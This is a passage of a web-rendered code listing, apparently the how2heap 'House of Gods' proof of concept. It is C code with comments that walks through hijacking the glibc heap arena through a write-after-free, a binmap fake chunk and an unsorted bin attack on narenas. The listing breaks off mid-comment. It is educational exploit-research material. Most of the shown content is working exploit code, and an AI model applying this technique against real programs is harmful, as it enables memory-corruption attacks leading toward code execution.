class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* House of Gods PoC */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Welcome to the House of Gods...</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * House of Gods is an arena hijacking technique for glibc &lt; 2.27. It supplies</span></span><br><span class="line"><span class="comment"> * the attacker with an arbitrary write against the thread_arena symbol of</span></span><br><span class="line"><span class="comment"> * the main thread. This can be used to replace the main_arena with a</span></span><br><span class="line"><span class="comment"> * carefully crafted fake arena. The exploit was tested against</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - glibc-2.23</span></span><br><span class="line"><span class="comment"> *     - glibc-2.24</span></span><br><span class="line"><span class="comment"> *     - glibc-2.25</span></span><br><span class="line"><span class="comment"> *     - glibc-2.26</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Following requirements are mandatory</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - 8 allocs of arbitrary size to hijack the arena (+2 for ACE)</span></span><br><span class="line"><span class="comment"> *     - control over first 5 quadwords of a chunk&#x27;s userdata</span></span><br><span class="line"><span class="comment"> *     - a single write-after-free bug on an unsorted chunk</span></span><br><span class="line"><span class="comment"> *     - heap address leak + libc address leak</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This PoC demonstrates how to leverage the House of Gods in order to hijack</span></span><br><span class="line"><span class="comment"> * the thread_arena. But it wont explain how to escalate further to</span></span><br><span class="line"><span class="comment"> * arbitrary code execution, since this step is trivial once the whole arena</span></span><br><span class="line"><span class="comment"> * is under control.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also note, that the how2heap PoC might use more allocations than</span></span><br><span class="line"><span class="comment"> * previously stated. This is intentional and has educational purposes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you want to read the full technical description of this technique, going</span></span><br><span class="line"><span class="comment"> * from zero to arbitrary code execution within only 10 to 11 allocations, here</span></span><br><span class="line"><span class="comment"> * is the original document I&#x27;ve written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I recommend reading this document while experimenting with</span></span><br><span class="line"><span class="comment"> * the how2heap PoC.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Besides that, this technique abuses a minor bug in glibc, which I have</span></span><br><span class="line"><span class="comment"> * already submitted to bugzilla at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * AUTHOR: David Milosevic (milo)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;--- Exploit PoC ---&gt; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;= House of Gods =\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== Abstract ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The core of this technique is to allocate a fakechunk overlapping\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the binmap field within the main_arena. This fakechunk is located at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x850. Its sizefield can be crafted by carefully binning chunks\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;into smallbins or largebins. The binmap-chunk is then being linked into\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the unsorted bin via a write-after-free bug in order to allocate it back\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;as an exact fit. One can now tamper with the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 and inject the address of a fake arena. A final unsorted bin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;attack corrupts the narenas variable with a very large value. From there, only\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;two more allocation requests for at least 0xffffffffffffffc0 bytes of memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;are needed to trigger two consecutive calls to the reused_arena() function,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which in turn traverses the corrupted arena-list and sets thread_arena to the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address stored in main_arena.next - the address of the fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== PoC ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, so let us start by allocating some chunks...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a smallchunk, for example a 0x90-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate the first fastchunk. We will use</span></span><br><span class="line"><span class="comment">     * a 0x20-chunk for this purpose.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a second fastchunk. This time</span></span><br><span class="line"><span class="comment">     * a 0x40-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our 0x90-sized smallchunk. We will bin this chunk to forge a\n&quot;</span>, SMALLCHUNK);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake sizefield for our binmap-chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our first fastchunk. Its size is 0x20.\n\n&quot;</span>, FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our second fastchunk with a size of 0x40. The usecase of\n&quot;</span>, FAST40);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;both fastchunks will be explained later in this PoC.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can move our smallchunk to the unsorted bin by simply free&#x27;ing it...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is a great opportunity to simulate a</span></span><br><span class="line"><span class="comment">     * libc leak. We just read the address of the</span></span><br><span class="line"><span class="comment">     * unsorted bin and save it for later.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span>*) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And now we need to make a request for a chunk which can not be serviced by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;our recently free&#x27;d smallchunk. Thus, we will make a request for a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0xa0-sized chunk - let us call this chunk INTM (intermediate).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * following allocation will trigger a binning</span></span><br><span class="line"><span class="comment">     * process within the unsorted bin and move</span></span><br><span class="line"><span class="comment">     * SMALLCHUNK to the 0x90-smallbin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our smallchunk should be now in the 0x90-smallbin. This process also triggered\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the mark_bin(m, i) macro within the malloc source code. If you inspect the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main_arena&#x27;s binmap located at offset 0x855, you will notice that the initial\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value of the binmap changed from 0x0 to 0x200 - which can be used as a valid\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizefield to bypass the unsorted bin checks.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We would also need a valid bk pointer in order to bypass the partial unlinking\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procedure within the unsorted bin. But luckily, the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 points initially to the start of the main_arena itself. This fact\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;makes it possible to pass the partial unlinking without segfaulting.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So now that we have crafted our binmap-chunk, it is time to allocate it\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;from the unsorted bin. For that, we will abuse a write-after-free bug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;on an unsorted chunk. Let us start...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First, allocate another smallchunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * recycle our previously binned smallchunk.</span></span><br><span class="line"><span class="comment">     * Note that, it is not neccessary to recycle this</span></span><br><span class="line"><span class="comment">     * chunk. I am doing it only to keep the heap layout</span></span><br><span class="line"><span class="comment">     * small and compact.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and now move our new chunk to the unsorted bin...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...in order to tamper with the free&#x27;d chunk&#x27;s bk pointer.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bug: a single write-after-free bug on an</span></span><br><span class="line"><span class="comment">     * unsorted chunk is enough to initiate the</span></span><br><span class="line"><span class="comment">     * House of Gods technique.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Great. We have redirected the unsorted bin to our binmap-chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;But we also have corrupted the bin. Let&#x27;s fix this, by redirecting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a second time.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The next chunk (head-&gt;bk-&gt;bk-&gt;bk) in the unsorted bin is located at the start\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point to another allocated chunk (INTM) by writing to its bk pointer before\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;actually free&#x27;ing it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * before free&#x27;ing those chunks, let us write</span></span><br><span class="line"><span class="comment">     * the address of another chunk to the currently</span></span><br><span class="line"><span class="comment">     * unused bk pointer of FAST40. We can reuse</span></span><br><span class="line"><span class="comment">     * the previously requested INTM chunk for that.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Free&#x27;ing FAST40 wont reset the bk pointer, thus</span></span><br><span class="line"><span class="comment">     * we can let it point to an allocated chunk while</span></span><br><span class="line"><span class="comment">     * having it stored in one of the fastbins.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The reason behind this, is the simple fact that</span></span><br><span class="line"><span class="comment">     * we will need to perform an unsorted bin attack later.</span></span><br><span class="line"><span class="comment">     * And we can not request a 0x40-chunk to trigger the</span></span><br><span class="line"><span class="comment">     * partial unlinking, since a 0x40 request will be serviced</span></span><br><span class="line"><span class="comment">     * from the fastbins instead of the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and now free the 0x20-chunk in order to forge a sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and the 0x40-chunk in order to forge a bk pointer.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay. The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The binmap attack is nearly done. The only thing left to do, is\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to make a request for a size that matches the binmap-chunk&#x27;s sizefield.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * all the hard work finally pays off...we can</span></span><br><span class="line"><span class="comment">     * now allocate the binmap-chunk from the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After allocating the binmap-chunk, the unsorted bin should look similar to this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And that is a binmap attack. We&#x27;ve successfully gained control over a small\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number of fields within the main-arena. Two of them are crucial for\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the House of Gods technique\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.next\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.system_mem\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;By tampering with the main_arena.next field, we can manipulate the arena&#x27;s\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;linked list and insert the address of a fake arena. Once this is done,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;we can trigger two calls to malloc&#x27;s reused_arena() function.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The purpose of the reused_arena() function is to return a non-corrupted,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;non-locked arena from the arena linked list in case that the current\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arena could not handle previous allocation request.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The first call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the current main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The second call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the previously injected fake arena (main_arena.next).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can reach the reused_arena() if we meet following conditions\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - exceeding the total amount of arenas a process can have.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      malloc keeps track by using the narenas variable as\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      an arena counter. If this counter exceeds the limit (narenas_limit),\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      it will start to reuse existing arenas from the arena list instead\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      of creating new ones. Luckily, we can set narenas to a very large\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      value by performing an unsorted bin attack against it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - force the malloc algorithm to ditch the current arena.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      When malloc notices a failure it will start a second allocation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      attempt with a different arena. We can mimic an allocation failure by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let us start with the unsorted bin attack. We load the address of narenas\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;minus 0x10 into the bk pointer of the currently allocated INTM chunk...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set INTM&#x27;s bk to narenas-0x10. This will</span></span><br><span class="line"><span class="comment">     * be our target for the unsorted bin attack.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and then manipulate the main_arena.system_mem field in order to pass the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size sanity checks for the chunk overlapping the main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this way we can abuse a heap pointer</span></span><br><span class="line"><span class="comment">     * as a valid sizefield.</span></span><br><span class="line"><span 